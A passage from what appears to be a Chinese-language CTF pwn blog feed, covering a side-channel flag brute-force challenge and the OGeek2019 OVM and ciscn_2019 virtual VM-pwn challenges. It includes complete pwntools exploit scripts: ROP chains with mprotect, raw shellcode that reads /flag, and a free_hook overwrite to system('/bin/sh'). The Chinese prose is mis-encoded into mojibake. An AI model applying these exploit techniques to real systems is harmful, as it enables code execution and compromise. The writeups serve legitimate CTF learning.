´çš„shellcodeå¤„ç†ä¸€ä¸‹å³å¯ã€‚</p><p>æœ€åè¦æ³¨æ„çš„æ˜¯openatè¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚æœæ˜¯ç»å¯¹è·¯å¾„çš„è¯é‚£ä¹ˆç›´æ¥å½“æˆopenç”¨å°±è¡Œ(ä¸è¿‡è¿˜å¾—ç»™ç¬¬ä¸€ä¸ªå‚æ•°å’Œç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè·¯å¾„ä½äºç¬¬äºŒä¸ªå‚æ•°çš„ä½ç½®)ï¼Œå¦‚æœæ˜¯ç›¸å¯¹è·¯å¾„çš„è¯ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„è·¯å¾„æ˜¯ç›¸å¯¹äºç¬¬ä¸€ä¸ªå‚æ•°æ–‡ä»¶æè¿°ç¬¦çš„ä½ç½®æ¥è¯´çš„ï¼Œå¦‚æœæƒ³ç›¸å¯¹äºå½“å‰å·¥ä½œç›®å½•çš„è·¯å¾„æ¥è¯´çš„è¯ï¼Œéœ€è¦ç¬¬ä¸€ä¸ªå‚æ•°ä¸º-100(ç¬¬ä¸‰ä¸ªå‚æ•°ä¹Ÿéœ€è¦æ˜¯æ­£å¸¸çš„ï¼Œå…·ä½“çš„è¯æŸ¥ä¸€ä¸‹æ‰‹å†Œæˆ–è€…ç™¾åº¦éƒ½è¡Œ)</p><p><img src="/../img/image-20220803110340977.png" alt="image-20220803110340977"></p><p>ä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥ï¼Œæˆ‘åªè¦ç”¨ç›¸å¯¹è·¯å¾„çš„è¯ï¼Œopenatç³»ç»Ÿè°ƒç”¨ä¹Ÿèƒ½é¡ºåˆ©æ‰§è¡Œï¼Œä½†æ˜¯è«åå…¶å¦™å°±æŠŠæˆ‘æœ¬åœ°çš„flagæ–‡ä»¶ç»™åˆ äº†ï¼Œæˆ‘ä¹Ÿæ˜¯å¾ˆæ‡µï¼Œæœ¬åœ°çš„è¯åªèƒ½ç”¨ç»å¯¹è·¯å¾„æ¥æã€‚</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">s=<span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"><span class="built_in">list</span>=[<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">index=<span class="number">0</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        p=process(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line">        <span class="comment">#p=remote(&#x27;pwn.challenge.ctf.show&#x27;,28080)</span></span><br><span class="line">        leave_ret=<span class="number">0x401402</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Please leave your name :\n&#x27;</span>,<span class="string">&#x27;%p%25$p&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">        leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">        leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#log_addr(&#x27;leak_libc_addr&#x27;)</span></span><br><span class="line">        <span class="comment">#log_addr(&#x27;leak_stack_addr&#x27;)</span></span><br><span class="line">        target_addr=leak_stack_addr+<span class="number">0x10</span></span><br><span class="line">        libc_base_addr=leak_libc_addr-<span class="number">0x271e3</span></span><br><span class="line">        <span class="comment">#log_addr(&#x27;libc_base_addr&#x27;)</span></span><br><span class="line">        <span class="comment">#debug(p,0x401403)</span></span><br><span class="line">        pop_rsi=libc_base_addr+<span class="number">0x2709c</span></span><br><span class="line">        pop_rdx_r12=libc_base_addr+<span class="number">0x11c421</span></span><br><span class="line">        pop_rdi=libc_base_addr+<span class="number">0x26bb2</span></span><br><span class="line">        syscall=libc_base_addr+<span class="number">0x2588d</span></span><br><span class="line">        pop_rax=libc_base_addr+<span class="number">0x28ff4</span></span><br><span class="line">        mprotect=libc_base_addr+<span class="number">0x11bbb0</span></span><br><span class="line">        bin_sh_addr=<span class="number">0x00000000001b6613</span>+libc_base_addr</span><br><span class="line">        rop=p64(pop_rdi)+p64(leak_stack_addr&amp;~<span class="number">0xfff</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        rop+=p64(pop_rax)+p64(<span class="number">10</span>)+p64(mprotect)+p64(leak_stack_addr+<span class="number">0x68</span>)</span><br><span class="line">        rop+=<span class="string">b&quot;\x48\x89\xE6\x48\xC7\xC7\x00\x00\x00\x00\x48\xC7\xC2\x00\x02\x00\x00\x0F\x05&quot;</span></span><br><span class="line">        payload=rop.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(target_addr-<span class="number">8</span>)+p64(leave_ret)</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Now, please tell us more about you to check in :\n&#x27;</span>,payload)</span><br><span class="line">        rop=<span class="string">b&quot;\x90&quot;</span>*<span class="number">23</span>+<span class="string">&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x68\x01\x01\x00\x00\x58\x6A\x00\x5A\x6A\x9C\x5F\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x0F\x05\x68\x60\x40\x40\x00\x5E\x6A\x00\x5F\x6A\x30\x5A\x48\x31\xC0\x0F\x05&quot;</span></span><br><span class="line">        shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rax,rsi</span></span><br><span class="line"><span class="string">        mov bl,byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">        cmp bl,&#123;&#125;</span></span><br><span class="line"><span class="string">        je $-3</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        rop+=asm(shellcode.<span class="built_in">format</span>(index,<span class="built_in">list</span>[i]))</span><br><span class="line">        p.sendline(rop)</span><br><span class="line">        judge=p.can_recv(timeout=<span class="number">3</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> judge:</span><br><span class="line">            log_info(<span class="string">&#x27;success!&#x27;</span>)</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">list</span>[i])</span><br><span class="line">            log_info(flag)</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#log_info(&#x27;wrong!&#x27;)</span></span><br><span class="line">            <span class="comment">#log_info(flag)</span></span><br><span class="line">        <span class="comment">#log(&#x27;i&#x27;,chr(list[i]))</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æˆ‘æ¯”è¾ƒå–œæ¬¢ç”¨è‡ªå·±æ±‡ç¼–è½¬çš„æœºå™¨ç ï¼Œä½†æ˜¯æœºå™¨ç çš„è¯ï¼Œå„ä½å¸ˆå‚…è‚¯å®šçœ‹çš„ä¸æ–¹ä¾¿ï¼Œæˆ‘è¿™é‡Œç»™ä¸€ä¸‹æˆ‘ropé“¾æœºå™¨ç å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ã€‚å¡«å……è¿™ä¹ˆå¤šnopæŒ‡ä»¤æ˜¯å› ä¸ºæˆ‘æ„é€ çš„ropé“¾ä¸­çš„readç³»ç»Ÿè°ƒç”¨è¾“å…¥çš„æ•°æ®éœ€è¦nopæŒ‡ä»¤å ä¸€ä¸‹ä½ï¼Œæ‰èƒ½å°†æœ‰æ•ˆæŒ‡ä»¤å†™åˆ°æ‰§è¡Œæµä¸Šã€‚(å¯ä»¥è°ƒreadçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä½†æˆ‘å½“æ—¶æ‡’çš„å¼„äº†ï¼Œè¿™æ ·çœäº‹)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rsi,rsp</span><br><span class="line">mov    rdi,0x0</span><br><span class="line">mov    rdx,0x200</span><br><span class="line">syscall</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">push 3</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 257</span><br><span class="line">pop rax</span><br><span class="line">push 0</span><br><span class="line">pop rdx</span><br><span class="line">push -100</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi, 0x67616c662f</span><br><span class="line">push rsi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">syscall</span><br><span class="line">push 0x404060</span><br><span class="line">pop rsi</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">push 0x30</span><br><span class="line">pop rdx</span><br><span class="line">xor rax,rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20220803111703647.png" alt="image-20220803111703647"></p><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://www.cnblogs.com/LynneHuan/p/15674233.html">roderickå¸ˆå‚…çš„åšå®¢</a></p><p><a href="https://www.cnblogs.com/winmt/articles/15943249.html">winmtå¸ˆå‚…çš„åšå®¢</a></p><p><a href="https://blog.csdn.net/The_perfect_world/article/details/89280224">https://blog.csdn.net/The_perfect_world/article/details/89280224</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¾§ä¿¡é“çˆ†ç ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºvm pwnçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/ccd7886.html"/>
      <url>/posts/ccd7886.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>ç›®å‰å°±åšäº†ä¸¤é“vm pwnçš„é¢˜ç›®å…ˆç®€å•æ€»ç»“ä¸€ä¸‹ï¼Œè¿™ç±»é¢˜ç›®é€†å‘é‡è¾ƒå¤§ï¼Œå¦‚æœæœ‰åˆ†æä¸æ‡‚çš„å‡½æ•°æˆ–è€…æŸæ®µæŒ‡ä»¤å¯ä»¥å°è¯•é…åˆgdbåŠ¨æ€è°ƒè¯•è§‚å¯ŸæŸäº›å¯„å­˜å™¨æˆ–å†…å­˜å€¼çš„å˜åŒ–æ¥çŒœæµ‹å…¶åŠŸèƒ½ã€‚æ¼æ´ç‚¹å¤§å¤šä¸ºæ•°ç»„è¶Šç•Œå¯ä»¥å†™æˆ–è€…ä»»æ„è¯»æ¥åŠ«æŒhookæˆ–è€…gotè¡¨ç­‰ç­‰ã€‚ä¸ä¸€å®šæ¯ä¸ªæŒ‡ä»¤éƒ½è¦å…·ä½“åˆ†ææ˜ç™½ï¼Œä¸ªäººè®¤ä¸ºå»å…³æ³¨æ¼æ´æŒ‡ä»¤ï¼Œå…¶ä»–æŒ‡ä»¤ç”¨åˆ°å“ªä¸ªå»ç®€å•åˆ†æå“ªä¸ª</p><h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><h3 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041849897.png" alt="image-20221204184926728"></p><h3 id="ç¨‹åºé€»è¾‘"><a href="#ç¨‹åºé€»è¾‘" class="headerlink" title="ç¨‹åºé€»è¾‘"></a>ç¨‹åºé€»è¾‘</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041852544.png" alt="image-20221204185221474"></p><p>é¦–å…ˆç¨‹åºç”³è¯·äº†ä¸€å—å †ç©ºé—´ï¼Œç¨‹åºç»“æŸçš„æ—¶å€™å¯ä»¥å¾€é‡Œé¢è¾“å…¥ä¸œè¥¿ï¼Œç„¶åå°†å…¶é‡Šæ”¾æ‰ã€‚éšåè¯¢é—®äº†PCå’ŒSPå¯„å­˜å™¨çš„å€¼(æ‰€è°“çš„å¯„å­˜å™¨å°±æ˜¯åœ¨bssæ®µä¸Šå¼€è¾Ÿçš„ä¸€ç‰‡æ•°ç»„)ï¼Œè€Œpcå’Œspåœ¨è¿™é“é¢˜é‡Œæ²¡æœ‰ä»»ä½•ç”¨ï¼Œæ¥ç€è¦æˆ‘ä»¬è¦è¾“å…¥æŒ‡ä»¤çš„ä¸ªæ•°ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041923932.png" alt="image-20221204192348862"></p><p>ä¸Šé¢ä»£ç çš„æ³¨é‡Šå†™çš„å¾ˆæ¸…æ¥šäº†ï¼Œä¸‹é¢çš„ä»£ç åœ¨whileå¾ªç¯é‡Œçš„éƒ¨åˆ†æ˜¯å¤„ç†æŒ‡ä»¤çš„éƒ¨åˆ†ï¼Œè€Œæœ€åreadå‡½æ•°å»å¾€å †å—é‡Œè¾“å…¥æ•°æ®ï¼Œå†å°†è¿™ä¸ªå †å—freeæ‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041924716.png" alt="image-20221204192408661"></p><p>åœ¨executeå‡½æ•°é‡Œå°†æˆ‘ä»¬è¾“å…¥çš„æ¯ä¸ªæŒ‡ä»¤éƒ½è¿›è¡Œäº†åˆ†æï¼Œå¤§æ¦‚å°±æ˜¯ç”¨cè¯­è¨€æ¥å®ç°äº†æ±‡ç¼–çš„æŒ‡ä»¤ï¼Œé¦–å…ˆæ¯ä¸ªæŒ‡ä»¤éƒ½æ˜¯å››å­—èŠ‚ï¼Œæœ€é«˜å­—èŠ‚æ˜¯ä¸€ä¸ªæ“ä½œç (è¿™ä¸ªæ“ä½œç ç”¨ifæ¥åˆ¤æ–­ï¼Œè¿™ä¸ªæŒ‡ä»¤æ˜¯å¹²å•¥çš„)ï¼Œç„¶åå¦å¤–ä¸‰ä¸ªå­—èŠ‚æ˜¯æ“ä½œæ•°ï¼Œä»¥addæŒ‡ä»¤ä¸ºä¾‹ï¼Œé¦–å…ˆç”¨HIBYTEè¿™ä¸ªå®åˆ¤æ–­æœ€é«˜å­—èŠ‚æ˜¯å¦ä¸º0x70ï¼Œå¦‚æœæ˜¯0x70å°±æ‰§è¡Œ</p><p><code>reg[high]=reg[low]+reg[medium]</code>å¾ˆæ˜æ˜¾è¿™æ˜¯ä¸ªaddæŒ‡ä»¤ã€‚é€šè¿‡regæ•°ç»„ä»¥åŠé…åˆå…¶ç´¢å¼•æ¥è¿›è¡Œçš„æ“ä½œï¼Œç´¢å¼•å°±æ˜¯æŒ‡ä»¤çš„å„ä¸ªå­—èŠ‚ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041944999.png" alt="image-20221204194431944"></p><p>ä¸‹é¢è¿™ä¸ªæŒ‡ä»¤æ˜¯å°†å…·ä½“çš„æ•°å€¼èµ‹å€¼ç»™regæ•°ç»„é‡Œçš„æŸä¸ªå…ƒç´ ï¼Œåªæœ‰èµ‹å€¼å®Œæ¯•ï¼Œä¸Šé¢çš„addæŒ‡ä»¤æ‰æœ‰ç”¨</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042032767.png" alt="image-20221204203212704"></p><p>è€Œæœ¬é¢˜çš„æ¼æ´åˆ™åœ¨ä¸‹é¢ä¸¤ä¸ªæŒ‡ä»¤</p><p>reg[low]çš„å€¼å¯ä»¥æ§åˆ¶ï¼Œè¿™æ„å‘³ç€memoryçš„ç´¢å¼•å¯ä»¥æº¢å‡ºï¼Œä»è€Œå»ç¯¡æ”¹æŸäº›æŒ‡é’ˆã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033519.png" alt="image-20221204203332481"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033212.png" alt="image-20221204203341172"></p><p>å› ä¸ºæ— æ³•ç¯¡æ”¹gotè¡¨ï¼Œæ‰€ä»¥æŠŠåˆ©ç”¨ç‚¹æ”¾åˆ°ç¨‹åºæœ€åå¾€commentçš„è¾“å…¥ä¸Š(å¦‚ä¸‹)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042035714.png" alt="image-20221204203553678"></p><p>å¦‚æœæˆ‘ä»¬èƒ½ç¯¡æ”¹commentè¿™ä¸ªæŒ‡é’ˆçš„è¯ï¼Œå°±æ„å‘³ç€ç¨‹åºçš„æœ€åå¯ä»¥ä»»æ„åœ°å€å†™ï¼Œå¹¶ä¸”è¿˜è°ƒç”¨äº†freeå‡½æ•°ï¼Œé‚£å°±åˆ©ç”¨æ•°ç»„æº¢å‡ºå°†commentæ”¹æˆfree_hook-8çš„åœ°å€ï¼Œæœ€åè¾“å…¥å­—ç¬¦ä¸²&#x2F;bin&#x2F;shä»¥åŠsystemçš„åœ°å€è¿‡å»ï¼Œæ‰§è¡Œfreeå‡½æ•°çš„æ—¶å€™åˆ™è·å–shellã€‚</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>é¦–å…ˆæˆ‘ä»¬è¦æŠŠfree_hook-8çš„åœ°å€å†™åˆ°ä¸€ä¸ªåœ°å€ä¸Šï¼Œç„¶åå°†è¿™ä¸ªåœ°å€åˆ©ç”¨æ•°ç»„æº¢å‡ºå†™åˆ°commentä¸Šã€‚è€Œç¬¬ä¸€æ­¥æˆ‘ä»¬éœ€è¦åšå‡ºæ¥ä¸€ä¸ªfree_hook-8çš„åœ°å€ï¼Œè€ƒè™‘åˆ°bssæ®µä¸Šæ–¹æ˜¯gotè¡¨ï¼Œæˆ‘ä»¬åˆ©ç”¨è´Ÿæ•°ç´¢å¼•å°±å¯ä»¥å®ç°åœ°å€ä»»æ„è¯»å–ï¼Œè¿™é‡Œæˆ‘è¯»å–çš„æ˜¯stderrçš„åœ°å€ï¼Œå°†å…¶è¯»åˆ°äº†reg[4][5]çš„ä½ç½®(å› ä¸ºåœ°å€æ˜¯å…«å­—èŠ‚ï¼Œè€Œä¸€ä¸ªæ•°ç»„å…ƒç´ æ˜¯å››å­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦ä¸¤ä¸ªæ•°ç»„å…ƒç´ æ”¾ä¸€ä¸ªåœ°å€)</p><p>è€Œåç”¨addæŒ‡ä»¤å°†stderrçš„åœ°å€æ”¹æˆfree_hook-8ï¼Œæœ€åå°†free_hook-8èµ‹å€¼åˆ°commentçš„ä½ç½®å³å¯ã€‚å…·ä½“æƒ…å†µå‚è€ƒexp</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26005&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;PC: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;SP: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;CODE SIZE: &quot;</span>,<span class="built_in">str</span>(<span class="number">18</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">op,high,medium,low</span>):</span><br><span class="line">    payload=(op&lt;&lt;<span class="number">24</span>)+(high&lt;&lt;<span class="number">16</span>)+(medium&lt;&lt;<span class="number">8</span>)+(low)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;CODE: &quot;</span>)</span><br><span class="line"><span class="comment">#create a stderr address in reg array</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>)     <span class="comment">#mov reg[0],26</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[1]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x30</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov reg[4],memory[reg[2]]</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">25</span>)     <span class="comment">#mov reg[0],25</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[1]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x30</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov reg[5],memory[reg[2]]       reg[4][5]---&gt;stderr address</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#create free_hook address through stderr address</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x10</span>)     <span class="comment">#mov reg[2],0x10</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>)      <span class="comment">#mov reg[0],8</span></span><br><span class="line">opcode(<span class="number">0xc0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>)      <span class="comment">#reg[1]=sal reg[2],8</span></span><br><span class="line"></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0xa0</span>)   <span class="comment">#mov reg[2],0xa0</span></span><br><span class="line">opcode(<span class="number">0x70</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>)      <span class="comment">#add reg[1],reg[2]</span></span><br><span class="line">opcode(<span class="number">0x70</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">1</span>)      <span class="comment">#add reg[4],reg[1]              reg[4][5]---&gt;free_hook address-8</span></span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xD39</span>)</span><br><span class="line"><span class="comment">#let pointer comment point to free_hook</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x8</span>)     <span class="comment">#mov reg[0],8</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[7]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x40</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov memory[reg[2]],reg[4]</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x7</span>)     <span class="comment">#mov reg[0],9</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[7]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x40</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov memory[reg[2]],reg[5]</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;R4: &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;R5: &quot;</span>)</span><br><span class="line">addr2=<span class="built_in">int</span>(p.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">sys_addr=addr1+((addr2)&lt;&lt;<span class="number">32</span>)-<span class="number">0x381410</span></span><br><span class="line">log_addr(<span class="string">&#x27;sys_addr&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042056131.png" alt="image-20221204205650878"></p><h2 id="ciscn-2019-qual-virtual"><a href="#ciscn-2019-qual-virtual" class="headerlink" title="ciscn_2019_qual_virtual"></a>ciscn_2019_qual_virtual</h2><h3 id="ä¿æŠ¤ç­–ç•¥-1"><a href="#ä¿æŠ¤ç­–ç•¥-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052243919.png" alt="image-20221205224348518"></p><h3 id="ç¨‹åºé€»è¾‘-1"><a href="#ç¨‹åºé€»è¾‘-1" class="headerlink" title="ç¨‹åºé€»è¾‘"></a>ç¨‹åºé€»è¾‘</h3><h4 id="æ§åˆ¶å †å—ä¸text-data-stack"><a href="#æ§åˆ¶å †å—ä¸text-data-stack" class="headerlink" title="æ§åˆ¶å †å—ä¸text data stack"></a>æ§åˆ¶å †å—ä¸text data stack</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052246509.png" alt="image-20221205224630447"></p><p>ç¨‹åºæœ€å¼€å§‹åˆ†é…äº†dataæ®µï¼Œtextæ®µå’Œstackæ®µã€‚ä»–ä»¬å®ç°çš„æ–¹å¼éƒ½æ˜¯ç”¨ä¸€ä¸ªæ§åˆ¶å †å—æ¥å­˜æ”¾ç”³è¯·å‡ºæ¥çš„è¿™ä¸ªæ®µçš„æŒ‡é’ˆï¼Œè€Œè¿”å›çš„æ˜¯æ§åˆ¶å †å—çš„åœ°å€(ä»¥stackæ®µä¸¾ä¾‹ï¼Œå¦‚ä¸‹)</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052248915.png" alt="image-20221205224802845" style="zoom:50%;" /><p>mallocå…ˆæ˜¯ç”³è¯·äº†0x10çš„å†…å­˜å‡ºæ¥ï¼Œå½“åšæ§åˆ¶å †å—ï¼Œè€Œåç”³è¯·äº†8*0x40çš„å†…å­˜å½“åšstackï¼Œå°†å…¶åœ°å€èµ‹ç»™sï¼Œè€Œsè¿™ä¸ªæŒ‡é’ˆå­˜æ”¾åˆ°äº†ptrè¿™ä¸ªæ§åˆ¶å †å—é‡Œï¼Œæœ€åè¿”å›ptrã€‚</p><h4 id="è·å–æ“ä½œç çš„å‡½æ•°"><a href="#è·å–æ“ä½œç çš„å‡½æ•°" class="headerlink" title="è·å–æ“ä½œç çš„å‡½æ•°"></a>è·å–æ“ä½œç çš„å‡½æ•°</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052250722.png" alt="image-20221205225055604"></p><p>è¿™é‡Œçš„å®ç°æ€è·¯æ˜¯æ£€æµ‹æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦å‡ºç°äº†æŒ‡ä»¤å­—ç¬¦ï¼Œæ¯”å¦‚push pop addç­‰ç­‰ï¼Œç„¶åå°†å¯¹åº”æŒ‡ä»¤æ¢æˆæ“ä½œç æ¥å­˜å‚¨åˆ°textæ®µä¸Š(èµ‹å€¼å¦‚ä¸‹)ï¼Œ40144Eå‡½æ•°å°†ptr[i]å­˜æ”¾çš„æœºå™¨ç ç»™åˆ°äº†a1(textæ®µ)</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052252420.png" alt="image-20221205225251375" style="zoom:67%;" 